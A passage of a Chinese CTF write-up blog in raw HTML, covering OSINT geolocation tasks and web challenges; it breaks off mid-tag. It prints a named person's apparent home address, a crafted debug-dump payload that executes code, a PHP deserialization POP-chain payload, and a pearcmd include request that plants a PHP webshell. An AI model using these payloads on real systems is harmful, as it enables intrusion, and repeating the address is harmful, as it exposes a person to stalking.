></p>\n<p>先定位到建筑的位置会更方便做剩下几问，于是打开谷歌识图：<br>发现了一模一样的建筑，连水管和猫头鹰装饰都一模一样！</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193140.png\"\n                      alt=\"alt text\"\n                ></p>\n<p>打开作者主页：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193150.png\"\n                      alt=\"微信图片_20250503193150\"\n                ></p>\n<p>其他图片显示的内容也佐证了这一点，<u>在海边</u>。</p>\n<p>本来想在谷歌地图里面暴走一圈找到这个建筑来着，但是太暴力了点。</p>\n<p>又想去其他社交平台找这个作者，但是没什么发现。不过意外发现了这个作者的住址：<strong><em>Jeremiah Regner, located at 9505 Gold Coast Dr Apt 98, San Diego, CA</em>.</strong></p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193205.png\"\n                      alt=\"微信图片_20250503193205\"\n                ></p>\n<p>地点极其符合——在谷歌地图定位这个地址：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193217.jpg\"\n                      alt=\"微信图片_20250503193217\"\n                ></p>\n<p>先在作者家附近的海岸找，果然找到了：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503193223.png\"\n                      alt=\"微信图片_20250503193223\"\n                ></p>\n<p>在地图上走啊走，就走到了：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503194002.png\"\n                      alt=\"微信图片_20250503194002\"\n                ></p>\n<p>ans：<u><strong>Hubbs Hall</strong></u></p>\n<h3 id=\"task2\"><a href=\"#task2\" class=\"headerlink\" title=\"task2\"></a>task2</h3><p>谷歌地图上是有充电头信息的，但是找不到，绷🤣</p>\n<p>不过好在有很多充电桩分布的网站提供信息。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503194142.png\"\n                      alt=\"微信图片_20250503194142\"\n                ></p>\n<p>ans：<u><strong>J1772</strong></u></p>\n<h3 id=\"task4\"><a href=\"#task4\" class=\"headerlink\" title=\"task4\"></a>task4</h3><p>ez，随便找个出发点，最后都要坐30路公交。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503194610.png\"\n                      alt=\"微信图片_20250503194610\"\n                ></p>\n<p>ans：<u><strong>30</strong></u></p>\n<h3 id=\"task5\"><a href=\"#task5\" class=\"headerlink\" title=\"task5\"></a>task5</h3><p>Hubbs Hall旁边的潮汐监测点在 Sccripps Pier，其站点编号是9410230。</p>\n<p>找到相关数据网站就有了。</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503195311.png\"\n                      alt=\"微信图片_20250503195311\"\n                ></p>\n<p>图中数据即是5月7号的海浪预测峰值</p>\n<p>p.s.：因为这里死活填不对，拷打了下出题人，出题人说可以ft转cm可以先舍去小数部分再计算，4ft算出来四舍五入是122，但是正确答案是121🥲。（原来保留整数就真的只是保留整数（部分）。。）</p>\n<p>以及不同网站的预测数据不太一样，有点搞……</p>\n<p>ans：<u><strong>122 or 143</strong></u></p>\n<h3 id=\"task6\"><a href=\"#task6\" class=\"headerlink\" title=\"task6\"></a>task6</h3><p>不学地理是这样的，☝️🤓可以算出海浪峰值周期40000多秒。</p>\n<p>找到现成的数据就好了：</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503200140.png\"\n                      alt=\"微信图片_20250503200140\"\n                ></p>\n<p>ans：<u><strong>10</strong></u></p>\n<h3 id=\"flag\"><a href=\"#flag\" class=\"headerlink\" title=\"flag\"></a>flag</h3><p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503200530.png\"\n                      alt=\"微信图片_20250503200530\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;Sc1ENc3_UndOUBTEd1Y_IMMorT4I_5EA_Un4R9U481y_IlLumln4tlnG&#125;</span><br></pre></td></tr></table></figure></div>\n<h1 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h1><h2 id=\"Core-Dump-Error（签到题）\"><a href=\"#Core-Dump-Error（签到题）\" class=\"headerlink\" title=\"Core Dump Error（签到题）\"></a>Core Dump Error（签到题）</h2><p>半夜误打误撞做出来了。</p>\n<p>原来视频里面的issue只是被close而不是被delete了 hhh。</p>\n<p>只要找到相关issue的POC链然后改一下exec执行的命令就好了</p>\n<div class=\"code-container\" data-rel=\"Json\"><figure class=\"iseeu highlight json\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;objects&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;1&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;frame&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;attrs&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_lineno&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;11&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_locals&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;12&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_code&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;13&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_globals&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;14&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;f_back&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;15&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;11&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;int&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"number\">1</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;12&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;dict&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;13&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;code&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;attrs&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;co_filename&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;131&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;co_name&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;132&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;14&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;dict&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;141&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;143&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;142&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;144&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;15&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;NoneType&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;131&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;filename&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;132&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;name&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;141&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;__name__&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;142&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;__loader__&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;143&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;str&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;print(open(&#x27;/tmp/flag&#x27;).read())&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;144&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;EvilLoader&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;attrs&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">          <span class=\"attr\">&quot;get_source&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;1441&quot;</span></span><br><span class=\"line\">        <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;1441&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;type&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;builtin_function&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;value&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;exec&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;threads&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;0&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">        <span class=\"attr\">&quot;frame&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;1&quot;</span></span><br><span class=\"line\">      <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;current_thread&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;0&quot;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;files&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;metadata&quot;</span><span class=\"punctuation\">:</span> <span class=\"punctuation\">&#123;</span></span><br><span class=\"line\">      <span class=\"attr\">&quot;version&quot;</span><span class=\"punctuation\">:</span> <span class=\"string\">&quot;0.4.0&quot;</span></span><br><span class=\"line\">    <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\">  <span class=\"punctuation\">&#125;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></div>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250505110938.png\"\n                      alt=\"微信图片_20250505110938\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag: W4terCTF&#123;c0N9ra7u1ATIonS_0N_hacK1nG_A_pRoGraM_foR_TH3_1IrSt_t1Me&#125;</span><br></pre></td></tr></table></figure></div>\n<h2 id=\"Happy-PHP\"><a href=\"#Happy-PHP\" class=\"headerlink\" title=\"Happy PHP\"></a>Happy PHP</h2><h3 id=\"part1\"><a href=\"#part1\" class=\"headerlink\" title=\"part1\"></a>part1</h3><p>阅读php代码，梳理逻辑如下：</p>\n<ul>\n<li>如果url中传递了参数  gogogo ，该对象就会被反序列化。</li>\n<li>反序列化的对象会触发魔术方法__wakeup()，并返回gogogo的结果。</li>\n<li><p>如果触发phpis 类的__invoke()方法，则执行fun1(fun2())，并通过eval()函数执行代码。返回结果 == ‘Yelia’的话，就调用 what-&gt;saying。</p>\n</li>\n<li><p>要调用piece1-&gt;here()，必须让 $flag 的 MD5 值等于 md5(666)。</p>\n</li>\n<li><p>如果两个不同的变量 $sy 和 $su 的 MD5 和 SHA1相等，就能echo fl491.txt。</p>\n</li>\n</ul>\n<p>通过构造反序列化的POP链，获得payload</p>\n<div class=\"code-container\" data-rel=\"Php\"><figure class=\"iseeu highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">phpis</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$what</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$fun1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$fun2</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__invoke</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class=\"variable\">$this</span>-&gt;fun1) )&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">preg_match</span>(<span class=\"string\">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class=\"variable\">$this</span>-&gt;fun2)) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$flag</span> = <span class=\"keyword\">eval</span>(<span class=\"string\">&quot;return <span class=\"subst\">$this</span>-&gt;fun1(<span class=\"subst\">$this</span>-&gt;fun2());&quot;</span>);</span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">intval</span>(<span class=\"variable\">$flag</span>) == <span class=\"string\">&#x27;Yelia&#x27;</span>)&#123;</span><br><span class=\"line\">                    <span class=\"variable language_\">$this</span>-&gt;what-&gt;<span class=\"title function_ invoke__\">saying</span>();</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    <span class=\"keyword\">die</span>(<span class=\"string\">&quot;nonono ,please try again !!&quot;</span>);</span><br><span class=\"line\">                &#125;            </span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">thebest</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$gogogo</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">language</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$v1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$piece1</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">right</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$sy</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$su</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$right</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">right</span>();</span><br><span class=\"line\"><span class=\"variable\">$right</span>-&gt;sy = [<span class=\"number\">1</span>];</span><br><span class=\"line\"><span class=\"variable\">$right</span>-&gt;su = [<span class=\"number\">2</span>]; </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$lang</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">language</span>();</span><br><span class=\"line\"><span class=\"variable\">$lang</span>-&gt;v1 = <span class=\"string\">&quot;flag=&quot;</span> . <span class=\"title function_ invoke__\">md5</span>(<span class=\"number\">666</span>);</span><br><span class=\"line\"><span class=\"variable\">$lang</span>-&gt;piece1 = <span class=\"variable\">$right</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$phpis</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">phpis</span>();</span><br><span class=\"line\"><span class=\"variable\">$phpis</span>-&gt;what = <span class=\"variable\">$lang</span>;</span><br><span class=\"line\"><span class=\"variable\">$phpis</span>-&gt;fun1 = <span class=\"string\">&quot;strlen&quot;</span>; </span><br><span class=\"line\"><span class=\"variable\">$phpis</span>-&gt;fun2 = <span class=\"string\">&quot;strrev&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$best</span> = <span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">thebest</span>();</span><br><span class=\"line\"><span class=\"variable\">$best</span>-&gt;gogogo = <span class=\"variable\">$phpis</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$payload</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$best</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"string\">&quot;payload：\\n\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$payload</span>) . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//payload: ?gogogo=O%3A7%3A%22thebest%22%3A1%3A%7Bs%3A6%3A%22gogogo%22%3BO%3A5%3A%22phpis%22%3A3%3A%7Bs%3A4%3A%22what%22%3BO%3A8%3A%22language%22%3A2%3A%7Bs%3A2%3A%22v1%22%3Bs%3A37%3A%22flag%3Dfae0b27c451c728867a567e8c1bb4e53%22%3Bs%3A6%3A%22piece1%22%3BO%3A5%3A%22right%22%3A2%3A%7Bs%3A2%3A%22sy%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A1%3B%7Ds%3A2%3A%22su%22%3Ba%3A1%3A%7Bi%3A0%3Bi%3A2%3B%7D%7D%7Ds%3A4%3A%22fun1%22%3Bs%3A6%3A%22strlen%22%3Bs%3A4%3A%22fun2%22%3Bs%3A6%3A%22strrev%22%3B%7D%7D    </span></span><br><span class=\"line\">    </span><br></pre></td></tr></table></figure></div>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250503204222.png\"\n                      alt=\"微信图片_20250503204222\"\n                ></p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Flag_piece_1: W4terCTF&#123;i5_pHp</span><br></pre></td></tr></table></figure></div>\n<h3 id=\"part2\"><a href=\"#part2\" class=\"headerlink\" title=\"part2\"></a>part2</h3><p>进到 /1nCLud3.php 目录下</p>\n<p>根据源码，需要构造参数file，同时又要绕过正则匹配。试了很多种绕过都不太行，虽然$_SERVER[‘QUERY_STRING’]在匹配的时候不会进行url解码，但是同样include打开文件的时候也不会进行url解码，试图构造用url编码方式绕过正则匹配的方式就行不通。</p>\n<p>根据提示：register_argc_argv=On，找到博客<a class=\"link\"   href=\"https://longlone.top/安全/安全研究/register_argc_argv与include to RCE的巧妙组合/\" >register_argc_argv与include to RCE的巧妙组合 - Longlone’s Blog<i class=\"fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon\"></i></a></p>\n<p>和这道题的思路非常像，所以仿照博客中的解题思路，利用pearcmd执行rce：</p>\n<p>“当我们include一个可以被php解析的文件的时候,php代码会被自动执行,这样在registerargcargv开启的情况下我们就有可能通过包含pearcmd.php与操控$_SERVER[‘argv’]来执行pear命令。”</p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=pearcmd&amp;+config-create+/&lt;?phpsystem($_GET[&#x27;cmd&#x27;]);?&gt;+/tmp/evil.php</span><br></pre></td></tr></table></figure></div>\n<p>因为浏览器会将&lt; ? &gt; 转义，所以通过burpsuite抓包后再GET传参</p>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     data-src=\"微信图片_20250504135809.png\"\n                      alt=\"微信图片_20250504135809\"\n                ></p>\n<p>这便拿到了cmd的控制权，随后查找剩下的flag</p>\n<p>通过include打开evil.php继续利用cmd</p>\n<div class=\"code-container\" data-rel=\"Plaintext\"><figure class=\"iseeu highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">?file=/tmp/evil&amp;cmd=ls /tmp</span><br></pre></td></tr></table></figure></div>\n<p><img  \n                     lazyload\n                     src=\"/images/loading.svg\"\n                     